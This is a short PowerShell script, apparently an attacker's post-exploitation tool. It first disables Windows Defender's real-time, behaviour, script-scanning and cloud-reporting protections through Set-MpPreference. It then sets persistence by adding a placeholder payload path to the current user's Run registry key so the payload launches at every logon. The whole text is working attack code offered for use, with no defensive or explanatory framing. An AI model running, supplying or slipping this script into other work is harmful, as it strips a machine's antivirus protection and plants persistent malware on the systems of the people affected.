# Disable Windows Defender Features
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisablePrivacyMode $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -MAPSReporting 0

# Set the full path to your payload (for example, a custom executable or script)
$payloadPath = "C:\Path\To\Your\Payload.exe"

# Define the registry key path for persistence under the current user context.
$regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Choose a name for the registry entry (this can be any identifier you prefer)
$entryName = "MyPersistenceTool"

# Create or update the registry value to point to your payload.
New-ItemProperty -Path $regKeyPath -Name $entryName -Value $payloadPath -PropertyType String -Force

Write-Output "Persistence established: $entryName will run $payloadPath at user logon."
